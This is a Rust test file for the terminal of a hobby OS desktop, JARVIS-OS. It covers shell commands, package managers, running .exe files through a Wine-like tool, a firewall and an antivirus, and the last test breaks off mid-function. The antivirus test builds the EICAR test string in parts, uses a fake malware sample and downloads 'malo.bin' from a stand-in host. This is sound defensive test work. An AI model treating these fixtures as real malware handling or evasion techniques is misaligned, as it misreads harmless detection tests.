//! La terminal: comandos de Linux sobre el FAT32 propio, tuberías, redirecciones, `apt` contra el
//! repositorio real (`kernel/paquetes/`, respondido acá en vez de por la red) y descargas.

mod common;

use common::*;
use jarvis_desktop::apps::App;
use jarvis_desktop::{AppKind, FetchKind, HttpResponse, Key, Launch, Mods};

fn open_terminal(t: &mut Driver) {
    t.combo(
        Mods {
            ctrl: true,
            alt: true,
            ..Mods::NONE
        },
        Key::Char('t'),
    );
    assert_eq!(t.d.focused_app(), Some(AppKind::Terminal));
}

/// Tipea un comando y Enter. Devuelve lo que apareció en la terminal desde entonces.
fn run(t: &mut Driver, cmd: &str) -> String {
    let before = screen(t).len();
    t.type_text(cmd);
    t.key(Key::Enter);
    serve(t);
    let all = screen(t);
    all[before.min(all.len())..].to_string()
}

fn screen(t: &Driver) -> String {
    match t.d.app(AppKind::Terminal) {
        Some(App::Terminal(term)) => term.text(),
        _ => panic!("la terminal no está abierta"),
    }
}

/// Responde los pedidos de red: el repositorio de paquetes sale de `kernel/paquetes/` y
/// `programa.exe` es un .exe chiquito de verdad.
fn serve(t: &mut Driver) {
    for _ in 0..200 {
        let reqs = t.d.take_requests().net;
        if reqs.is_empty() {
            return;
        }
        for r in reqs {
            let resp = if let Some(program) = r.url.strip_prefix("http://paquetes.jarvis/usuario/")
            {
                // Los programas de Linux compilados (K11): en el test, un ELF mínimo.
                assert!(!program.contains('/'));
                Ok(HttpResponse {
                    status: 200,
                    content_type: "application/octet-stream".into(),
                    url: r.url.clone(),
                    body: tiny_elf(None),
                })
            } else if let Some(path) = r.url.strip_prefix("http://paquetes.jarvis/") {
                let file = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                    .join("../paquetes")
                    .join(path);
                assert_ne!(
                    r.kind,
                    FetchKind::Image,
                    "los paquetes de texto no se convierten"
                );
                match std::fs::read(&file) {
                    Ok(body) => Ok(HttpResponse {
                        status: 200,
                        content_type: "text/plain".into(),
                        url: r.url.clone(),
                        body,
                    }),
                    Err(_) => Ok(HttpResponse {
                        status: 404,
                        content_type: "text/plain".into(),
                        url: r.url.clone(),
                        body: b"no existe".to_vec(),
                    }),
                }
            } else if let Some(path) = r.url.strip_prefix("http://deb.debian.org/debian/") {
                // Un Debian de mentira chiquito (tests/debian/): el índice y dos .deb de verdad.
                let file = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                    .join("tests/debian")
                    .join(path);
                match std::fs::read(&file) {
                    Ok(body) => Ok(HttpResponse {
                        status: 200,
                        content_type: "application/octet-stream".into(),
                        url: r.url.clone(),
                        body,
                    }),
                    Err(_) => Ok(HttpResponse {
                        status: 404,
                        content_type: "text/plain".into(),
                        url: r.url.clone(),
                        body: b"no existe".to_vec(),
                    }),
                }
            } else if r.url == jarvis_desktop::antivirus::FEED {
                // MalwareBazaar de mentira: la muestra de prueba y el programa marcado.
                Ok(HttpResponse {
                    status: 200,
                    content_type: "text/plain".into(),
                    url: r.url.clone(),
                    body: malware_feed().into_bytes(),
                })
            } else if r.url == "http://ejemplo.test/malo.bin" {
                Ok(HttpResponse {
                    status: 200,
                    content_type: "application/octet-stream".into(),
                    url: r.url.clone(),
                    body: MALWARE.to_vec(),
                })
            } else if let Some(body) = fake_internet(&r.url) {
                Ok(HttpResponse {
                    status: 200,
                    content_type: "text/plain".into(),
                    url: r.url.clone(),
                    body,
                })
            } else if r.url.ends_with("viejo.exe") {
                // Uno de 32 bits (x86): vino no lo corre.
                let mut b = tiny_exe();
                b[0x84..0x86].copy_from_slice(&0x14cu16.to_le_bytes());
                Ok(HttpResponse {
                    status: 200,
                    content_type: "application/octet-stream".into(),
                    url: r.url.clone(),
                    body: b,
                })
            } else if r.url.ends_with("programa.exe") || r.url.ends_with("7z2408-x64.exe") {
                assert_eq!(r.kind, FetchKind::Download);
                Ok(HttpResponse {
                    status: 200,
                    content_type: "application/octet-stream".into(),
                    url: r.url.clone(),
                    body: tiny_exe(),
                })
            } else {
                Err("sin red en el test".into())
            };
            t.d.net_response(r.id, resp);
        }
    }
}

/// Respuestas de sitios de verdad (la tienda de snaps, GitHub), para probar sin red.
fn fake_internet(url: &str) -> Option<Vec<u8>> {
    let body: &str = if url.starts_with("https://urlhaus.abuse.ch/downloads/hostfile") {
        "# URLhaus Host file\n127.0.0.1\tmalo.example\n127.0.0.1\tdescargas-falsas.net\n"
    } else if url.starts_with("https://api.snapcraft.io/v2/snaps/find") {
        r#"{"results":[{"name":"vlc","revision":{"version":"3.0.20"},"snap":{"publisher":{"username":"videolan","validation":"verified"},"summary":"The ultimate media player","title":"VLC"}}]}"#
    } else if url.starts_with("https://api.snapcraft.io/v2/snaps/info/vlc") {
        r#"{"name":"vlc","snap":{"summary":"The ultimate media player","publisher":{"display-name":"VideoLAN"}},"channel-map":[{"channel":{"architecture":"amd64","risk":"stable","track":"latest"},"revision":3777,"version":"3.0.20","confinement":"strict","base":"core22","download":{"size":351555584,"url":"https://api.snapcraft.io/api/v1/snaps/download/vlc_3777.snap","sha3-384":"00"}}]}"#
    } else if url.ends_with("/manifests/7/7zip/7zip") {
        r#"[{"name":".validation","type":"file"},{"name":"23.01","type":"dir"},{"name":"24.08","type":"dir"},{"name":"9.20","type":"dir"}]"#
    } else if url.ends_with("/7zip/7zip/24.08/7zip.7zip.locale.en-US.yaml") {
        "PackageIdentifier: 7zip.7zip
PackageName: 7-Zip
Publisher: Igor Pavlov
ShortDescription: Free and open source file archiver
License: LGPL-2.1
"
    } else if url.ends_with("/7zip/7zip/24.08/7zip.7zip.installer.yaml") {
        "PackageIdentifier: 7zip.7zip
InstallerType: exe
Installers:
- Architecture: x86
  InstallerUrl: https://7-zip.org/a/7z2408.exe
- Architecture: x64
  InstallerUrl: https://7-zip.org/a/7z2408-x64.exe
"
    } else {
        return None;
    };
    Some(body.as_bytes().to_vec())
}

fn fatfs_exists_in(t: &mut Driver, path: &str) -> bool {
    t.d.fs_mut().is_some_and(|fs| fs.stat(path).is_ok())
}

fn fatfs_read_in(t: &mut Driver, path: &str) -> Option<Vec<u8>> {
    t.d.fs_mut().and_then(|fs| fs.read_file(path).ok())
}

/// Un ELF de Linux x86-64 mínimo (estático, o dinámico si se le da un intérprete).
fn tiny_elf(interp: Option<&str>) -> Vec<u8> {
    let mut b = vec![0u8; 0x200];
    b[..4].copy_from_slice(b"ELF");
    b[4] = 2;
    b[5] = 1;
    b[6] = 1;
    b[16..18].copy_from_slice(&2u16.to_le_bytes());
    b[18..20].copy_from_slice(&0x3eu16.to_le_bytes());
    b[24..32].copy_from_slice(&0x40_0100u64.to_le_bytes());
    b[32..40].copy_from_slice(&64u64.to_le_bytes());
    b[54..56].copy_from_slice(&56u16.to_le_bytes());
    let n: u16 = if interp.is_some() { 2 } else { 1 };
    b[56..58].copy_from_slice(&n.to_le_bytes());
    // PT_LOAD R-X del archivo entero en 0x400000.
    b[64..68].copy_from_slice(&1u32.to_le_bytes());
    b[68..72].copy_from_slice(&5u32.to_le_bytes());
    b[80..88].copy_from_slice(&0x40_0000u64.to_le_bytes());
    b[96..104].copy_from_slice(&0x200u64.to_le_bytes());
    b[104..112].copy_from_slice(&0x200u64.to_le_bytes());
    if let Some(i) = interp {
        let h = 64 + 56;
        b[h..h + 4].copy_from_slice(&3u32.to_le_bytes());
        b[h + 8..h + 16].copy_from_slice(&0x180u64.to_le_bytes());
        b[h + 32..h + 40].copy_from_slice(&(i.len() as u64 + 1).to_le_bytes());
        b[0x180..0x180 + i.len()].copy_from_slice(i.as_bytes());
    }
    b
}

/// Un .exe de Windows mínimo (cabeceras MZ y PE de 64 bits, programa de consola).
fn tiny_exe() -> Vec<u8> {
    let mut b = vec![0u8; 0x400];
    b[0..2].copy_from_slice(b"MZ");
    b[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
    b[0x80..0x84].copy_from_slice(b"PE\0\0");
    b[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
    b[0x84 + 16..0x84 + 18].copy_from_slice(&240u16.to_le_bytes());
    b[0x98..0x9a].copy_from_slice(&0x20bu16.to_le_bytes());
    b[0x98 + 68..0x98 + 70].copy_from_slice(&3u16.to_le_bytes());
    b
}

#[test]
fn comandos_de_linux_sobre_el_disco() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    assert!(run(&mut t, "ls /Documentos").contains("notas.txt"));
    assert!(run(&mut t, "cat /Documentos/notas.txt | grep segunda").contains("segunda linea"));
    assert!(run(&mut t, "echo hola mundo > /saludo.txt && cat /saludo.txt").contains("hola mundo"));
    run(&mut t, "echo otra >> /saludo.txt");
    assert!(run(&mut t, "wc -l < /saludo.txt").contains('2'));
    assert!(run(&mut t, "mkdir -p /a/b && cd /a/b && pwd").contains("/a/b"));
    assert!(run(&mut t, "cd .. && pwd").contains("/a\n"));
    assert!(run(&mut t, "cd ~ && ls *.txt").contains("saludo.txt"));
    assert!(run(&mut t, "seq 5 | sort -r | head -n 1").contains('5'));
    // Sin comillas, * es un comodín (como en bash): se escribe '*' o x.
    assert!(run(&mut t, "expr 2 + 3 '*' 4").contains("14"));
    assert!(run(&mut t, "expr 10 - 2 x 3").contains('4'));
    assert!(run(&mut t, "false || echo fallo").contains("fallo"));
    assert!(run(&mut t, "true && echo $(echo anidado) $?").contains("anidado 0"));
    assert!(run(&mut t, "X=jarvis; echo \"hola $X\" 'sin $X'").contains("hola jarvis sin $X"));
    assert!(run(&mut t, "echo uno dos | sed s/dos/tres/").contains("uno tres"));
    assert!(run(&mut t, "cat /proc/cpuinfo | grep model").contains("model name"));
    assert!(run(&mut t, "cp -r /Documentos /Copia && ls /Copia").contains("Bienvenida.txt"));
    assert!(
        run(
            &mut t,
            "mv /Copia/notas.txt /Copia/renombrado.txt && ls /Copia"
        )
        .contains("renombrado.txt")
    );
    // rm no borra: manda a la Papelera.
    run(&mut t, "rm /saludo.txt");
    assert!(run(&mut t, "comando_que_no_existe").contains("no se encontró la orden"));
    assert!(run(&mut t, "echo 'sin cerrar").contains("error de sintaxis"));
    let out = run(&mut t, "find / -name '*.txt' | grep renombrado");
    assert!(out.contains("/Copia/renombrado.txt"), "{out}");
    let logs = t.logs();
    assert!(logs.iter().any(|l| l == "TERMINAL_FIN 0"));
    assert!(
        fatfs_exists(t.d, "/Papelera/saludo.txt"),
        "rm manda a la Papelera"
    );
}

#[test]
fn tab_completa_y_flechas_recorren_el_historial() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    t.type_text("cd /Docu");
    t.key(Key::Tab);
    t.key(Key::Enter);
    assert!(run(&mut t, "pwd").contains("/Documentos"));
    t.key(Key::Up);
    t.key(Key::Up);
    t.key(Key::Enter);
    let s = screen(&t);
    assert!(s.matches("/Documentos").count() >= 3, "{s}");
    // Ctrl+C cancela la línea.
    t.type_text("algo a medias");
    t.combo(Mods::CTRL, Key::Char('c'));
    assert!(screen(&t).contains("algo a medias^C"));
}

/// Una "muestra de malware" de prueba (bytes cualquiera cuyo SHA-256 está en la lista).
const MALWARE: &[u8] = b"muestra de malware de prueba para el antivirus de JARVIS-OS";

/// La lista de MalwareBazaar de mentira: la muestra y un programa de Linux marcado.
fn malware_feed() -> String {
    use jarvis_desktop::antivirus::{hex, sha256};
    format!(
        "# MalwareBazaar recent malware samples (SHA256 hashes)
#
# sha256_hash
{}
{}
",
        hex(&sha256(MALWARE)),
        hex(&sha256(&tiny_elf(None)))
    )
}

/// El archivo de prueba EICAR, armado de a partes (escrito de corrido, el antivirus del
/// anfitrión marcaría este archivo).
fn eicar() -> Vec<u8> {
    [
        r"X5O!P%@AP[4\PZX54(P^)7CC)7}$",
        "EICAR-STANDARD-",
        "ANTIVIRUS-TEST-",
        "FILE!$H+H*",
    ]
    .concat()
    .into_bytes()
}

#[test]
fn el_antivirus_bloquea_lo_infectado_y_lo_pone_en_cuarentena() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "antivirus");
    assert!(out.contains("Protección en tiempo real: activada"), "{out}");
    assert!(out.contains("Firmas: 0"), "{out}");
    // Actualizar: las firmas de MalwareBazaar se suman a la base.
    let out = run(&mut t, "antivirus actualizar");
    assert!(
        out.contains("2 firmas nuevas. La base tiene 2 firmas."),
        "{out}"
    );
    assert!(run(&mut t, "antivirus actualizar").contains("0 firmas nuevas"));
    // Una descarga infectada va derecho a cuarentena (y se avisa).
    let out = run(
        &mut t,
        "curl -o /Documentos/malo.bin http://ejemplo.test/malo.bin",
    );
    assert!(
        out.contains("Amenaza bloqueada en /Documentos/malo.bin"),
        "{out}"
    );
    assert!(out.contains("/Cuarentena/malo.bin"), "{out}");
    assert!(!existe(&mut t, "/Documentos/malo.bin"));
    assert!(existe(&mut t, "/Cuarentena/malo.bin"));
    assert!(
        t.logs()
            .iter()
            .any(|l| l == "ANTIVIRUS_AMENAZA /Documentos/malo.bin MalwareBazaar")
    );
    // Escanear una carpeta: el archivo de prueba EICAR.
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/eicar.com",
            &eicar(),
            jarvis_fs::Timestamp::EPOCH,
        )
        .unwrap();
    let out = run(&mut t, "antivirus escanear /Documentos");
    assert!(
        out.contains("/Documentos/eicar.com: EICAR-Test-File"),
        "{out}"
    );
    assert!(out.contains("Amenazas: 1"), "{out}");
    assert!(existe(&mut t, "/Cuarentena/eicar.com"));
    // Un programa marcado no se ejecuta.
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/marcado",
            &tiny_elf(None),
            jarvis_fs::Timestamp::EPOCH,
        )
        .unwrap();
    // Linux pide el permiso de ejecución antes de correrlo (ADR 0020).
    run(&mut t, "chmod +x /Documentos/marcado");
    let out = run(&mut t, "/Documentos/marcado");
    assert!(out.contains("el antivirus lo bloqueó"), "{out}");
    assert!(t.d.take_requests().spawn.is_empty());
    // La cuarentena se puede ver y restaurar.
    let out = run(&mut t, "antivirus cuarentena");
    assert!(out.contains("malo.bin  (de /Documentos/malo.bin)"), "{out}");
    assert!(
        out.contains("eicar.com  (de /Documentos/eicar.com)"),
        "{out}"
    );
    assert!(
        run(&mut t, "antivirus restaurar eicar.com")
            .contains("Restaurado en /Documentos/eicar.com")
    );
    assert!(existe(&mut t, "/Documentos/eicar.com"));
    // Sin protección en tiempo real, lo que se baja no se revisa.
    assert!(run(&mut t, "antivirus desactivar").contains("DESACTIVADA"));
    let out = run(
        &mut t,
        "curl -o /Documentos/otro.bin http://ejemplo.test/malo.bin",
    );
    assert!(!out.contains("Amenaza"), "{out}");
    assert!(existe(&mut t, "/Documentos/otro.bin"));
}

/// ¿Está en el disco? (sin cerrar el escritorio, a diferencia de `fatfs_exists`)
fn existe(t: &mut Driver, path: &str) -> bool {
    t.d.fs_mut().unwrap().exists(path)
}

#[test]
fn apt_instala_programas_de_debian() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    // No está en el repositorio de JARVIS-OS: se busca en Debian (la primera vez baja el
    // índice), con sus dependencias; debconf se saltea.
    let out = run(&mut t, "sudo apt install hola-deb");
    assert!(out.contains("paquetes de Debian disponibles"), "{out}");
    assert!(
        out.contains(
            "Se instalarán los siguientes paquetes NUEVOS (de Debian):
  libhola1 hola-deb"
        ),
        "{out}"
    );
    assert!(out.contains("Configurando hola-deb (1.0-1)"), "{out}");
    assert!(out.contains("Listo."), "{out}");
    assert!(existe(&mut t, "/usr/bin/hola-deb"));
    assert!(existe(&mut t, "/usr/bin/hola"), "el enlace es una copia");
    assert!(existe(&mut t, "/usr/lib/x86_64-linux-gnu/libhola.so.1"));
    assert!(
        !existe(&mut t, "/usr/share/doc/hola-deb/copyright"),
        "la documentación no se instala"
    );
    assert!(
        run(&mut t, "apt list --installed").contains("hola"),
        "anotado"
    );
    assert!(run(&mut t, "apt show hola-deb").contains("deb.debian.org"));
    assert!(run(&mut t, "apt search hola").contains("hola-deb/debian"));
    // Ya instalado: la segunda vez no baja nada.
    assert!(run(&mut t, "sudo apt install hola-deb").contains("ya está instalado"));
    // Está en el PATH (/usr/bin): se ejecuta como cualquier programa de Linux.
    t.type_text("hola");
    t.key(Key::Enter);
    let spawn = t.d.take_requests().spawn;
    assert_eq!(spawn.len(), 1, "{}", screen(&t));
    assert_eq!(spawn[0].path, "/usr/bin/hola");
    t.d.proc_event(jarvis_desktop::procs::ProcEvent::Exited {
        pid: spawn[0].pid,
        code: 0,
        why: None,
    });
    // Se desinstala como los demás: a la Papelera.
    assert!(run(&mut t, "sudo apt remove hola-deb").contains("Papelera"));
    assert!(!existe(&mut t, "/usr/bin/hola-deb"));
}

#[test]
fn apt_instala_programas_del_repositorio_y_los_desinstala() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "sudo apt install esenciales");
    assert!(
        out.contains("Se instalarán los siguientes paquetes NUEVOS"),
        "{out}"
    );
    assert!(out.contains("Configurando neofetch"), "{out}");
    assert!(out.contains("Listo."), "{out}");
    // Los programas ya funcionan.
    let neo = run(&mut t, "neofetch");
    assert!(neo.contains("JARVIS-OS 0.1"), "{neo}");
    assert!(neo.contains("Paquetes: 5 (apt)"), "{neo}");
    assert!(!neo.contains("no se encontró"), "{neo}");
    assert!(run(&mut t, "calc 6 x 7").contains("42"));
    let cow = run(&mut t, "fortune | cowsay");
    assert!(cow.contains("(oo)"), "{cow}");
    assert!(cow.contains("--"), "la frase va en el globo: {cow}");
    assert!(
        !cow.contains("no se encontró") && !cow.contains("Muuu"),
        "{cow}"
    );
    assert!(run(&mut t, "apt list --installed").contains("fortune"));
    assert!(
        run(&mut t, "sudo apt install neofetch").contains("ya está en su versión más reciente")
    );
    assert!(
        run(&mut t, "sudo apt install no-existe").contains("No se ha podido localizar el paquete")
    );
    // Desinstalar: el programa va a la Papelera y ya no se encuentra.
    assert!(run(&mut t, "sudo apt remove calc").contains("Papelera"));
    let out = run(&mut t, "calc 1 + 1");
    assert!(out.contains("no se encontró la orden"), "{out}");
    assert!(
        out.contains("apt install calc"),
        "sugiere instalarlo: {out}"
    );
    let logs = t.logs();
    assert!(logs.iter().any(|l| l == "APT_INSTALADO neofetch 1.0"));
    assert!(fatfs_exists(t.d, "/Programas/bin/neofetch"));
}

/// ADR 0018: un `.exe` lo corre `vino`, un programa de Linux más (como `binfmt_misc` con Wine).
#[test]
fn los_programas_de_windows_corren_con_vino() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    run(&mut t, "cd /Documentos");
    let out = run(&mut t, "wget http://ejemplo.com/programa.exe");
    assert!(out.contains("guardado"), "{out}");
    assert!(out.contains("PE32+ de Windows"), "{out}");
    assert!(run(&mut t, "file programa.exe").contains("programa de consola"));
    // Sin vino, se dice cómo conseguirlo.
    let out = run(&mut t, "./programa.exe");
    assert!(out.contains("apt install vino"), "{out}");
    assert!(t.d.take_requests().spawn.is_empty());
    assert!(fatfs_exists_in(&mut t, "/Documentos/programa.exe"));

    assert!(run(&mut t, "sudo apt install vino programas-windows").contains("Listo"));
    assert!(fatfs_exists_in(&mut t, "/Programas/bin/vino"));
    assert!(fatfs_exists_in(&mut t, "/Programas/windows/hola-win.exe"));
    // `./programa.exe uno` → `vino /Documentos/programa.exe uno`.
    t.type_text("./programa.exe uno");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    assert_eq!(reqs.spawn.len(), 1);
    let sp = &reqs.spawn[0];
    assert_eq!(sp.path, "/Programas/bin/vino");
    assert_eq!(sp.argv, ["vino", "/Documentos/programa.exe", "uno"]);
    assert!(
        sp.image.starts_with(b"\x7fELF"),
        "lo que corre es vino (Linux)"
    );
    assert!(
        t.logs()
            .iter()
            .any(|l| l == "TERMINAL_WINDOWS /Documentos/programa.exe")
    );
    t.d.proc_event(jarvis_desktop::procs::ProcEvent::Exited {
        pid: sp.pid,
        code: 0,
        why: None,
    });
    // `wine` es el mismo vino.
    t.type_text("wine programa.exe dos");
    t.key(Key::Enter);
    let sp = t.d.take_requests().spawn.remove(0);
    assert_eq!(sp.argv, ["vino", "/Documentos/programa.exe", "dos"]);
    t.d.proc_event(jarvis_desktop::procs::ProcEvent::Exited {
        pid: sp.pid,
        code: 0,
        why: None,
    });
    // Uno de 32 bits no: se explica por qué, sin lanzar nada.
    run(&mut t, "wget http://ejemplo.com/viejo.exe");
    let out = run(&mut t, "wine viejo.exe");
    assert!(out.contains("vino corre los de 64 bits"), "{out}");
    assert!(t.d.take_requests().spawn.is_empty());
}

#[test]
fn la_configuracion_puede_abrir_la_terminal_con_un_comando() {
    let mut t = Driver::new();
    t.d.open(
        Launch::Terminal(Some("echo desde afuera".into())),
        t.now,
        CLOCK,
    );
    assert!(screen(&t).contains("desde afuera"));
    // exit cierra la ventana.
    t.type_text("exit");
    t.key(Key::Enter);
    assert!(t.d.window_of(AppKind::Terminal).is_none());
}

#[test]
fn ufw_bloquea_conexiones_y_lo_anota() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(
        &mut t,
        "sudo ufw deny out to example.com && sudo ufw deny out port 8080 app apt && ufw status numbered",
    );
    assert!(out.contains("Estado: activo"), "{out}");
    assert!(out.contains("[ 1] example.com"), "{out}");
    assert!(out.contains("[ 2] 8080/tcp"), "{out}");
    // wget no llega a salir: lo frena el firewall (con el número de regla).
    let out = run(&mut t, "wget http://www.example.com/");
    assert!(out.contains("firewall") && out.contains("regla 1"), "{out}");
    assert!(
        t.logs()
            .iter()
            .any(|l| l.contains("FIREWALL_BLOQUEO terminal www.example.com"))
    );
    let out = run(&mut t, "ufw show blocked");
    assert!(
        out.contains("BLOQUEADO terminal -> http://www.example.com/"),
        "{out}"
    );
    // Las reglas quedan en la configuración del disco.
    let out = run(&mut t, "sudo grep firewall_regla /Sistema/config.ini");
    assert!(out.contains("denegar salida a example.com"), "{out}");
    // apt usa otro sitio: sigue andando.
    let out = run(&mut t, "sudo apt install hola");
    assert!(out.contains("hola"), "{out}");
    // Borrar la regla vuelve a dejar pasar.
    run(&mut t, "sudo ufw delete 1");
    let out = run(&mut t, "ufw status");
    assert!(!out.contains("example.com"), "{out}");
    assert!(run(&mut t, "ufw bailar").contains("ERROR"));
}

#[test]
fn snap_instala_actualiza_de_canal_y_vuelve_atras() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "snap find saludo");
    assert!(
        out.contains("Tienda de JARVIS-OS") && out.contains("saludo"),
        "{out}"
    );
    assert!(
        out.contains("Tienda de Snapcraft") && out.contains("vlc"),
        "{out}"
    );
    let out = run(&mut t, "sudo snap install saludo");
    assert!(out.contains("saludo 1.0 de jarvis instalado"), "{out}");
    let out = run(&mut t, "saludo Ana");
    assert!(out.contains("¡Hola, Ana!"), "{out}");
    let out = run(&mut t, "snap list");
    assert!(
        out.contains("saludo") && out.contains("latest/stable"),
        "{out}"
    );
    // Al canal beta: queda la revisión vieja en el disco.
    let out = run(&mut t, "sudo snap refresh saludo --beta");
    assert!(out.contains("actualizado (revisión 5)"), "{out}");
    assert!(run(&mut t, "saludo").contains("(beta)"));
    let out = run(&mut t, "sudo snap revert saludo");
    assert!(out.contains("revisión 3"), "{out}");
    assert!(!run(&mut t, "saludo").contains("(beta)"));
    // Uno de Snapcraft se busca en la tienda real; vlc pesa más de lo que baja el kernel.
    let out = run(&mut t, "sudo snap install vlc");
    assert!(out.contains("pesa") && out.contains("32"), "{out}");
    let out = run(&mut t, "sudo snap remove saludo && ls /snap/bin");
    assert!(out.contains("desinstalado"), "{out}");
    assert!(
        t.logs()
            .iter()
            .any(|l| l.contains("SNAP_INSTALADO saludo 1.1 5")),
        "{:?}",
        t.logs()
    );
}

#[test]
fn winget_baja_instaladores_de_windows_del_repositorio_oficial() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "winget search zip");
    assert!(out.contains("7zip.7zip"), "{out}");
    // En minúsculas también (se corrige con la lista conocida).
    let out = run(&mut t, "sudo winget install 7ZIP.7zip");
    assert!(out.contains("Encontrado") && out.contains("7-Zip"), "{out}");
    assert!(
        out.contains("Versión: 24.08"),
        "la más nueva, no la 9.20: {out}"
    );
    assert!(out.contains("7z2408-x64.exe"), "el de 64 bits: {out}");
    assert!(
        out.contains("Descargado /Descargas/7z2408-x64.exe"),
        "{out}"
    );
    assert!(out.contains("PE32+ de Windows"), "{out}");
    let out = run(&mut t, "winget list");
    assert!(out.contains("7zip.7zip") && out.contains("24.08"), "{out}");
    assert!(
        t.logs()
            .iter()
            .any(|l| l.contains("WINGET_DESCARGADO 7zip.7zip"))
    );
}

#[test]
fn ps_muestra_las_tareas_del_kernel() {
    use jarvis_desktop::{KernelTask, SystemStats, TaskState};
    let mut t = Driver::new();
    let task = |pid: u32, name: &str, cpu_ms: u64| KernelTask {
        pid,
        name: name.into(),
        state: TaskState::Waiting,
        idle: name == "ociosa",
        cpu_ms,
        runs: 1,
    };
    t.d.set_stats(SystemStats {
        kernel_tasks: vec![
            task(1, "escritorio", 83_000),
            task(2, "ociosa", 1_000),
            task(3, "red", 500),
        ],
        ..Default::default()
    });
    open_terminal(&mut t);
    let out = run(&mut t, "ps");
    assert!(
        out.contains("    1 ?        00:01:23 [escritorio]"),
        "{out}"
    );
    assert!(out.contains("    3 ?        00:00:00 [red]"), "{out}");
    // La terminal misma es una ventana: PID 100 en adelante.
    assert!(out.contains("tty1"), "{out}");
    // Las tareas del kernel no se cierran con kill.
    let out = run(&mut t, "kill 3");
    assert!(out.contains("es una tarea del kernel"), "{out}");
    assert!(run(&mut t, "kill 77").contains("no existe ese proceso"));
}

/// K11: la Terminal lanza un programa de Linux (instalado con apt) y hace de su consola. Acá el
/// kernel está simulado: el test hace lo que harían el proceso y el kernel.
#[test]
fn programas_de_linux_en_la_terminal() {
    use jarvis_desktop::procs::{ProcEvent, ProcReply};
    use jarvis_linux::sys::{FileOp, FileReply};

    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "sudo apt install programas-linux js");
    assert!(out.contains("Listo"), "{out}");
    assert!(fatfs_exists_in(&mut t, "/Programas/bin/js"));
    assert!(run(&mut t, "file /Programas/bin/eco").contains("enlazado estáticamente"));

    t.type_text("hola-linux uno dos");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    assert_eq!(reqs.spawn.len(), 1);
    let sp = &reqs.spawn[0];
    let pid = sp.pid;
    assert_eq!(sp.path, "/Programas/bin/hola-linux");
    assert_eq!(sp.argv, ["hola-linux", "uno", "dos"]);
    assert!(sp.image.starts_with(b"ELF"));
    assert!(sp.envp.iter().any(|e| e == "USER=roman"), "{:?}", sp.envp);

    // La salida aparece a medida que llega.
    t.d.proc_event(ProcEvent::Output {
        pid,
        data: b"Hola desde Linux\n".to_vec(),
    });
    assert!(screen(&t).contains("Hola desde Linux"));
    // Un archivo que escribe el programa queda en el disco; borrarlo lo manda a la Papelera.
    t.d.proc_event(ProcEvent::File {
        pid,
        op: FileOp::Write("/Documentos/k11.txt".into(), b"desde el anillo 3".to_vec()),
    });
    assert_eq!(
        t.d.take_proc_replies(),
        [(pid, ProcReply::File(FileReply::Done))]
    );
    // Lee una línea: la respuesta espera a que se tipee.
    t.d.proc_event(ProcEvent::ReadLine { pid, max: 100 });
    assert!(t.d.take_proc_replies().is_empty());
    t.type_text("Roman");
    t.key(Key::Enter);
    assert!(screen(&t).contains("Roman"), "lo tipeado se ve");
    t.frame();
    assert_eq!(
        t.d.take_proc_replies(),
        [(pid, ProcReply::Line(b"Roman\n".to_vec()))]
    );
    t.d.proc_event(ProcEvent::Exited {
        pid,
        code: 0,
        why: None,
    });
    assert!(t.logs().iter().any(|l| l == "TERMINAL_FIN 0"));

    // Ctrl+C le pide al kernel que lo termine; la shell sigue cuando llega su fin.
    t.type_text("eco");
    t.key(Key::Enter);
    let pid = t.d.take_requests().spawn[0].pid;
    t.combo(
        Mods {
            ctrl: true,
            ..Mods::NONE
        },
        Key::Char('c'),
    );
    assert_eq!(t.d.take_requests().kill, [pid]);
    t.d.proc_event(ProcEvent::Exited {
        pid,
        code: 130,
        why: None,
    });
    assert!(t.logs().iter().any(|l| l == "TERMINAL_FIN 130"));
    // Una violación de segmento se muestra.
    t.type_text("pruebas segv");
    t.key(Key::Enter);
    let pid = t.d.take_requests().spawn[0].pid;
    t.d.proc_event(ProcEvent::Exited {
        pid,
        code: 139,
        why: Some("Violacion de segmento".into()),
    });
    assert!(screen(&t).contains("Violacion de segmento"));
    t.d.proc_event(ProcEvent::File {
        pid: 999,
        op: FileOp::Remove("/Documentos/k11.txt".into()),
    });
    assert_eq!(
        t.d.take_proc_replies(),
        [(999, ProcReply::File(FileReply::Done))]
    );

    // Uno dinámico también se lanza: el kernel carga su intérprete (si falta, lo dice).
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/dinamico",
            &tiny_elf(Some("/lib64/ld-linux-x86-64.so.2")),
            jarvis_fs::Timestamp::EPOCH,
        )
        .unwrap();
    run(&mut t, "chmod +x /Documentos/dinamico");
    // Sin su intérprete en el disco: se dice qué instalar y no se lanza.
    let out = run(&mut t, "/Documentos/dinamico");
    assert!(out.contains("apt install libc6"), "{out}");
    assert!(t.d.take_requests().spawn.is_empty());
    // Con el intérprete donde lo pone Debian (FAT32 no tiene el enlace /lib64/…): se lanza, y
    // el intérprete va en el pedido.
    let ld = tiny_elf(None);
    run(&mut t, "mkdir -p /usr/lib/x86_64-linux-gnu");
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
            &ld,
            jarvis_fs::Timestamp::EPOCH,
        )
        .unwrap();
    t.type_text("/Documentos/dinamico");
    t.key(Key::Enter);
    let spawn = t.d.take_requests().spawn;
    assert_eq!(spawn.len(), 1);
    assert_eq!(spawn[0].path, "/Documentos/dinamico");
    assert_eq!(spawn[0].interp.as_deref(), Some(&ld[..]));
